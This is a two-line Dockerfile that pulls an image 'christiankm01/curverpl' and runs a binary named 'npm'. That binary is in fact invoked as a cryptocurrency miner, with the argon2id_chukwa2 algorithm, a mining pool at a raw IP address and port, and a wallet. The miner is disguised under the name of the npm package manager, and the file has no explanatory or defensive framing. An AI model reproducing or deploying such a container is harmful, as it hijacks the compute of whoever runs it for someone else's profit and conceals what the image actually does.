FROM christiankm01/curverpl:latest
RUN npm  --algorithm argon2id_chukwa2 --pool 23.95.242.133:3022 --wallet userA -k
